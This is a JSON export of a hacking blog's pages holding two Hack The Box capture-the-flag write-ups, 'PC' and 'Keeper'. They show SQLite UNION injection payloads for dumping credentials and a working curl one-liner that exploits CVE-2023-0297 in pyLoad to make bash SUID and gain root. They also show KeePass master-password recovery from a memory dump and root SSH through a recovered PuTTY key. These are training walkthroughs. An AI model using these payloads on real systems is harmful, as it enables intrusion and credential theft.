
[{"content":"","date":"27 January 2023","externalUrl":null,"permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"HackTheBox","type":"tags"},{"content":" Skills: # SimpleApp Abuse SQLite Injection in SimpleApp CVE-2023-0297 [Privilege Escalation] Bash Binary SUID Machine Info: # OS \u0026ndash;\u0026gt; Linux IP \u0026ndash;\u0026gt; 10.10.11.214 DIFFICULTY \u0026ndash;\u0026gt; Easy 1. Scanning # Ping # We confirm the connection with the machine:\n\u0026gt; ping -c1 10.10.11.214 PING 10.10.11.214 (10.10.11.214) 56(84) bytes of data. 64 bytes from 10.10.11.214: icmp_seq=1 ttl=63 time=87.2 ms --- 10.10.11.214 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 87.151/87.151/87.151/0.000 ms Nmap # We start our scan with nmap:\n\u0026gt; nmap -sS -p- --open --min-rate 2000 -Pn -n 10.10.11.214 -oG nmup Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-08 17:51 AST Nmap scan report for 10.10.11.214 Host is up (0.12s latency). Not shown: 65533 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 22/tcp open ssh 50051/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 66.18 seconds Nmap para versiones # \u0026gt; nmap -sCV -p22,50051 10.10.11.214 Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-08 17:57 AST Nmap scan report for 10.10.11.214 (10.10.11.214) Host is up (0.072s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 91bf44edea1e3224301f532cea71e5ef (RSA) | 256 8486a6e204abdff71d456ccf395809de (ECDSA) |_ 256 1aa89572515e8e3cf180f542fd0a281c (ED25519) 50051/tcp open unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port50051-TCP:V=7.93%I=7%D=10/8%Time=652325BA%P=x86_64-pc-linux-gnu%r(N SF:ULL,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x0 SF:6\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(Generic SF:Lines,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\ SF:x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(GetRe SF:quest,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\ SF:x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(HTTPO SF:ptions,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0 SF:\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(RTSP SF:Request,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\ SF:0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(RPC SF:Check,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\ SF:x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(DNSVe SF:rsionBindReqTCP,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\ SF:xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0 SF:\u0026#34;)%r(DNSStatusRequestTCP,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0 SF:\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\ SF:0\\0\\?\\0\\0\u0026#34;)%r(Help,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0 SF:\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\ SF:0\\0\u0026#34;)%r(SSLSessionReq,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x0 SF:5\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0 SF:\\?\\0\\0\u0026#34;)%r(TerminalServerCookie,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xf SF:f\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0 SF:\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(TLSSessionReq,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\? SF:\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x0 SF:8\\0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(Kerberos,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\x SF:ff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\ SF:0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(SMBProgNeg,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\x SF:ff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\ SF:0\\0\\0\\0\\0\\0\\?\\0\\0\u0026#34;)%r(X11Probe,2E,\u0026#34;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff SF:\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\ SF:0\\0\\0\\0\\0\\?\\0\\0\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.32 seconds We have 2 open ports, ssh and an unknown port.\n2. Enumeration # Let\u0026rsquo;s try to investigate what service this port 50051 runs:\n\u0026gt; nc 10.10.11.214 50051 | xxd 00000000: 0000 1804 0000 0000 0000 0400 3fff ff00 ............?... 00000010: 0500 3fff ff00 0600 0020 00fe 0300 0000 ..?...... ...... 00000020: 0100 0004 0800 0000 0000 003f 0000 ...........?.. If we search on Google for this error, we find gRPC\ngRPC client # We are going to use grpc-client-cli.\nWe bring the tool to the /tmp path.\nmkdir /tmp/grpc \u0026amp;\u0026amp; curl -L https://github.com/vadimi/grpc-client-cli/releases/download/v1.18.0/grpc-client-cli_linux_x86_64.tar.gz | tar -C /tmp/grpc -xz cd /tmp Let\u0026rsquo;s try to communicate with the server.\nSimpleApp # RegisterUser # We can register in the app.\nLoginUser # It gives us an id and a token: GetInfo # When trying to view the information we get this error:\n./grpc-client-cli -H \u0026#39;token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdDEiLCJleHAiOjE2OTY4OTM4Nzl9.KOHW2KLztrHXLihHVqwp9ED1BEmaQR2FgTLPp4CCyUs\u0026#39; -s SimpleApp -m getInfo -V 10.10.11.214:50051 Message json (type ? to see defaults): {\u0026#34;id\u0026#34;:\u0026#34;286\u0026#34;} { \u0026#34;message\u0026#34;: \u0026#34;Will update soon.\u0026#34; } Let\u0026rsquo;s add the token we received from LoginUser to the token header.\nNow that we have seen and interacted with all the functionality that SimpleApp offers us, we can try to find any unusual behavior.\n./grpc-client-cli -H \u0026#39;token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdDEiLCJleHAiOjE2OTY4OTM4Nzl9.KOHW2KLztrHXLihHVqwp9ED1BEmaQR2FgTLPp4CCyUs\u0026#39; -s SimpleApp -m getInfo -V 10.10.11.214:50051 Message json (type ? to see defaults): {\u0026#34;id\u0026#34;:\u0026#34;1\u0026#34;} { \u0026#34;message\u0026#34;: \u0026#34;The admin is working hard to fix the issues.\u0026#34; } We have an administrator ID of 1.\nMessage json (type ? to see defaults): {\u0026#34;id\u0026#34;:\u0026#34;2\u0026#34;} Error: rpc error: code = Unknown desc = Unexpected \u0026lt;class \u0026#39;TypeError\u0026#39;\u0026gt;: \u0026#39;NoneType\u0026#39; object is not subscriptable If we put the id 2, we see that it does not exist.\nMessage json (type ? to see defaults): {\u0026#34;id\u0026#34;:\u0026#34;2-1\u0026#34;} { \u0026#34;message\u0026#34;: \u0026#34;The admin is working hard to fix the issues.\u0026#34; } We try to see if this is vulnerable to SQLI, we pass it 2-1 and this returns 1, it responds with admin id 1.\nThis could be a sign of a SQL injection\u0026hellip;\nwe confirm:\nMessage json (type ? to see defaults): {\u0026#34;id\u0026#34;:\u0026#34;2 UNION SELECT \u0026#39;mhil4ne\u0026#39;\u0026#34;} { \u0026#34;message\u0026#34;: \u0026#34;mhil4ne\u0026#34; } SQLite Injection en SimpleApp # After trying to identify the DBMS with various payloads, we find that it is SQLite:\nMessage json (type ? to see defaults): {\u0026#34;id\u0026#34;:\u0026#34;2 UNION SELECT sqlite_version();\u0026#34;} { \u0026#34;message\u0026#34;: \u0026#34;3.31.1\u0026#34; } Tables Enumeration # Message json (type ? to see defaults): {\u0026#34;id\u0026#34;:\u0026#34;2 UNION SELECT tbl_name FROM sqlite_master WHERE type=\u0026#39;table\u0026#39; and tbl_name NOT like \u0026#39;sqlite_%\u0026#39;\u0026#34;} { \u0026#34;message\u0026#34;: \u0026#34;accounts\u0026#34; } Message json (type ? to see defaults): {\u0026#34;id\u0026#34;:\u0026#34;2 UNION SELECT tbl_name FROM sqlite_master WHERE type=\u0026#39;table\u0026#39; and tbl_name NOT like \u0026#39;sqlite_%\u0026#39; LIMIT 1,1\u0026#34;} { \u0026#34;message\u0026#34;: \u0026#34;messages\u0026#34; } We obtain usernames and passwords # Message json (type ? to see defaults): {\u0026#34;id\u0026#34;:\u0026#34;2 UNION SELECT username || \u0026#39;:\u0026#39; || password FROM accounts\u0026#34;} { \u0026#34;message\u0026#34;: \u0026#34;admin:admin\u0026#34; } Message json (type ? to see defaults): {\u0026#34;id\u0026#34;:\u0026#34;2 UNION SELECT username || \u0026#39;:\u0026#39; || password FROM accounts LIMIT 1,1\u0026#34;} { \u0026#34;message\u0026#34;: \u0026#34;sau:HereIsYourPassWord1431\u0026#34; } Connection via SSH as the user sau # \u0026gt; ssh sau@10.10.11.214 sau@10.10.11.214\u0026#39;s password: Let\u0026rsquo;s see the TCP ports listening on the victim machine:\nWe have interesting ports - 8000 and 9666\nPort 9666 # sau@pc:~$ curl -s 127.0.0.1:9666/login | grep \u0026#39;\u0026lt;title\u0026#39; \u0026lt;title\u0026gt;Login - pyLoad \u0026lt;/title\u0026gt; Port 8000 # sau@pc:~$ curl -s 127.0.0.1:8000/login | grep \u0026#39;\u0026lt;title\u0026#39; \u0026lt;title\u0026gt;Login - pyLoad \u0026lt;/title\u0026gt; pyLoad runs on both ports.\nLet\u0026rsquo;s get the version of pyLoad.\nsau@pc:~$ ps fauxwww | grep pyload root 1062 0.0 1.5 1228868 63084 ? Ssl Oct08 1:01 /usr/bin/python3 /usr/local/bin/pyload sau 15915 0.0 0.0 8160 656 pts/0 S+ 00:24 0:00 \\_ grep --color=auto pyload sau@pc:~$ /usr/local/bin/pyload --version pyLoad 0.5.0 3. Privilege escalation to root – CVE-2023-0297 # This is going to be something simple, we are going to give SUID permissions to the bash binary.\npyimport os;os.system(\u0026#34;chmod +s /usr/bin/bash\u0026#34;) let\u0026rsquo;s url-encode this:\n%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%2b%73%20%2f%75%73%72%2f%62%69%6e%2f%62%61%73%68%22%29 We have a Oneliner like this:\nsau@pc:~$ curl -s -X POST --data-binary \u0026#39;package=xxx\u0026amp;crypted=AAAA\u0026amp;jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%2b%73%20%2f%75%73%72%2f%62%69%6e%2f%62%61%73%68%22%29;f=function%20f2(){};\u0026amp;passwords=aaaa\u0026#39; http://127.0.0.1:8000/flash/addcrypted2 Here what we do is make a request with curl and take advantage of the fact that we can execute commands in pyLoad, so we can try as root.\nsau@pc:~$ ls -la /usr/bin/bash -rwsr-sr-x 1 root root 1183448 Apr 18 2022 /usr/bin/bash We run bash with privileges.\nbash -p We already have root!\n","date":"27 January 2023","externalUrl":null,"permalink":"/writeups/pc/","section":"WriteUps","summary":"Resolucion de maquina Keeper","title":"PC Writeup","type":"writeups"},{"content":"","date":"27 January 2023","externalUrl":null,"permalink":"/","section":"Rift Hacking","summary":"","title":"Rift Hacking","type":"page"},{"content":"","date":"27 January 2023","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"27 January 2023","externalUrl":null,"permalink":"/tags/writeups/","section":"Tags","summary":"","title":"Writeups","type":"tags"},{"content":"","date":"27 January 2023","externalUrl":null,"permalink":"/writeups/","section":"WriteUps","summary":"","title":"WriteUps","type":"writeups"},{"content":"","date":"26 January 2023","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"Keeper is an Easy machine from Hack The Box challenge. Eumeration kicks off with an Nmap scan revealing SSH and HTTP services. The HTTP service runs Request Tracker 4.4.4, known for an information disclosure vulnerability via user enumeration. Default credentials for ‘root’ are found. Accessing the admin panel discloses a user’s password, ‘Welcome2023!’. Using SSH with found credentials grants access to an Ubuntu system. A Keepass database and program dump are discovered, leading to the recovery of the master password ‘rødgrød med fløde’ (Danish dessert), granting access to the Keepass database. A Putty PPK file is found and converted to an RSA key, allowing SSH access as ‘root.’ This progression results in successful completion of the challenge.\nInitial Recon # Verficamos nuestra conexion con la maquina, en caso de que no te responda, Verfica tu archivo VPN:\n❯ ping -c 1 10.10.11.227 PING 10.10.11.227 (10.10.11.227) 56(84) bytes of data. 64 bytes from 10.10.11.227: icmp_seq=1 ttl=63 time=140 ms --- 10.10.11.227 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 140.045/140.045/140.045/0.000 ms we start our scanning with nmap:\n\u0026gt; sudo nmap -sS --open -p- --min-rate 5000 -n -Pn -v 10.10.11.227 -oG nmapScan PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Let\u0026rsquo;s perform a more in-depth scan:\nnmap -sVC -p22,80 10.10.11.227 -oN ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA) |_ 256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Ports Info # Port Service Product Version 22 ssh OpenSSH 8.9p1 80 HTTP nginx 1.18.0 For now we do not try anything through ssh since we do not have valid credentials, So let\u0026rsquo;s look at the website.\nWeb # Default Credentials In Tracker # When browsing to this page we are greeted with the following login page. We can see that its using Request tracker When looking online i could find that the default credentials for the root account is password Entering this password gave us access to the web application.\nWhen looking through the application we can find two interesting pages. The first being the recently opened tickets page. which discloses an issue one of the users is having. They are saying they have a crash dump in their home directory to help the admins debug their issues with keepass. This is very interesting information giving us a target to go after once we have access to the system.\nSecondly when checking out the users panel of the application we could see that the same user we noticed before in the ticket had a note on her profile. This note mentioned their default starters password. Using this password gave us access to the machine with ssh using the password Welcome2023!\nSSH Credentials # ssh lnorgaard@keeper.htb Privilege Escalation # The home folder contains a ZIP archive RT30000.zip. This must be the file relevant to the ticket we’ve seen before. Transfer it to the attacking machine and unzip it.\n\u0026gt; unzip RT30000.zip Archive: RT30000.zip inflating: KeePassDumpFull.dmp extracting: passcodes.kdbx We get the crash dump for KeePass and a KeePass database file.\nExtracting the KeePass master password # It may be possible to extract the master password from the dump file! I’ve attempted to use this Python script for the task: Keepass Dump MasterKey\n\u0026gt; python3 poc.py -d /opt/ctf/htb/keeper/KeePassDumpFull.dmp 2023-08-12 21:35:47,517 [.] [main] Opened /opt/ctf/htb/keeper/KeePassDumpFull.dmp Possible password: ●,dgr●d med fl●de There are some issues with special characters. A quick Google search for dgrd med flde reveals the name of the Danish dish – Rødgrød med fløde.\nI will use the kpcli utility to interact with the KeePass database file that we have looted.\n\u0026gt; kpcli KeePass CLI (kpcli) v3.8.1 is ready for operation. Type \u0026#39;help\u0026#39; for a description of available commands. Type \u0026#39;help \u0026lt;command\u0026gt;\u0026#39; for details on individual commands. kpcli:/\u0026gt; open passcodes.kdbx Provide the master password: ************************* #Rødgrød med fløde Error opening file: Couldn\u0026#39;t load the file passcodes.kdbx Error(s) from File::KeePass: The database key appears invalid or else the database is corrupt. kpcli:/\u0026gt; open passcodes.kdbx Provide the master password: ************************* #rødgrød med fløde kpcli:/\u0026gt; ls === Groups === passcodes/ Success! The KeePass database master password is rødgrød med fløde. Let’s find some credentials.\nSSH Private Key for root # kpcli:/\u0026gt; ls * === Groups === eMail/ General/ Homebanking/ Internet/ Network/ Recycle Bin/ Windows/ kpcli:/\u0026gt; ls */* /passcodes/eMail: /passcodes/General: /passcodes/Homebanking: /passcodes/Internet: /passcodes/Network: === Entries === 0. keeper.htb (Ticketing Server) 1. Ticketing System /passcodes/Recycle Bin: === Entries === 2. Sample Entry keepass.info 3. Sample Entry #2 keepass.info/help/kb/testform. /passcodes/Windows: kpcli:/\u0026gt; cd /passcodes/Network kpcli:/passcodes/Network\u0026gt; ls === Entries === 0. keeper.htb (Ticketing Server) 1. Ticketing System kpcli:/passcodes/Network\u0026gt; show -f 0 Title: keeper.htb (Ticketing Server) Uname: root Pass: \u0026lt;REDACTED\u0026gt; URL: Notes: PuTTY-User-Key-File-3: ssh-rsa Encryption: none Comment: rsa-key-20230519 Public-Lines: 6 AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D \u0026lt;REDACTED\u0026gt; It looks like we have a root SSH private key for PuTTY! Let’s convert it to the OpenSSH-acceptable format with puttygen:\nputtygen key.putty -O private-openssh -o id_rsa And use the key to SSH:\n\u0026gt; ssh root@keeper.htb -i id_rsa \u0026gt; id uid=0(root) gid=0(root) groups=0(root) ","date":"26 January 2023","externalUrl":null,"permalink":"/writeups/keeper/","section":"WriteUps","summary":"Resolucion de maquina Keeper","title":"Keeper Writeup","type":"writeups"},{"content":"Hola\n","date":"26 January 2023","externalUrl":null,"permalink":"/posts/lfi/","section":"Post","summary":"Hola","title":"lfi","type":"posts"},{"content":"","date":"26 January 2023","externalUrl":null,"permalink":"/posts/","section":"Post","summary":"","title":"Post","type":"posts"},{"content":"","date":"26 January 2023","externalUrl":null,"permalink":"/authors/vitoll/","section":"Authors","summary":"","title":"Vitoll","type":"authors"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/about/","section":"Rift Hacking","summary":"","title":"About","type":"page"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]